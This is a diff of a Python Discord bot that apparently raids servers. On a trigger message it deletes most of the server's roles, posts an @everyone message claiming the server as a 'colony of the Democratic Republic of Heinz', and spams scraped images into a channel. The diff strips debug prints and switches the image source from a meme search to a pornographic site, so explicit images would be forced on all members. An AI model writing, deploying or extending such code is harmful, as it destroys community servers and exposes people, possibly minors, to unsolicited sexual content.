@@ -63,8 +63,6 @@ async def on_message(message):
           roles = []
           for role in message.guild.roles: #get all roles
                     roles.append(role)
-                    print(role.name)
-          print("---")
                     
           for role in roles[2:]:
                await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
@@ -81,7 +79,7 @@ async def on_message(message):
           #-spam images-
           heinz = client.get_channel(message.guild.channels[0].id)
           await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
-          for y in imagesearch.getImages("https://www.bing.com/images/search?q=memes"):
+          for y in imagesearch.getImages("https://hentaihaven.xxx"):
                async with aiohttp.ClientSession() as session:
                     async with session.get(y) as resp:
                        if resp.status != 200:
